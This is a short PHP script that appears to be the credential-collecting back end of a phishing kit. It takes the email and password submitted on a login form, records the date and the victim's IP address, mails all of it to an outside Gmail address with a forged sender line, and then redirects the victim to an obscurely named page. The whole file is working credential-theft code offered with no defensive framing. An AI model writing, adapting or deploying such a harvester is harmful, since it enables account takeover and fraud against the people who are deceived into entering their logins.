<?
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$email = $_POST['email'];
$password = $_POST['password'];
$message  = "=============\n";
$message .= "Email : ".$email."\n";
$message .= "Password :  ".$password."\n";
$message .= "=============\n";
$message .= "Date : $date\n";
$message .= "IP : $ip\n";
$message .= "=============\n";
$send = "briangoldclaim@gmail.com";
$subject = "logme now";
$headers = "From: Logme <miccoleman147@gmail.com>";
mail($send,$subject,$message,$headers);
header("LOCATION: b5e2rehijb5ejicehmhgceogkrepkfowpfk.php");
?>